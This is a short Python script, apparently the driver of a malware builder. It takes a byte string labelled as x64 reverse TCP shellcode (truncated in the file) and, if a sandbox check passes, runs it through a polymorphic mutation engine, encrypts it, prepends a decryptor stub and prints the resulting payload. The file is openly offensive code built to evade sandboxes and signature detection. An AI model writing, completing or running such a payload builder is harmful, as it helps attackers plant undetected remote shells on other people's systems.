from src.engine import PolymorphicEngine
from src.evasion import EvasionTechniques

# Original metasploit-like reverse TCP shellcode (x64)
original_shellcode = (
	b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
	b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
	# ... (truncated for brevity)
)

if __name__ == "__main__":
	engine = PolymorphicEngine()
	
	if not EvasionTechniques.is_sandbox():
		mutated = engine.mutate(original_shellcode)
		encrypted = engine.encrypt(mutated)
		decryptor = engine.generate_decryptor_stub()
		
		final_payload = decryptor + encrypted
		print(f"Generated payload ({len(final_payload)} bytes):")
		print(final_payload.hex())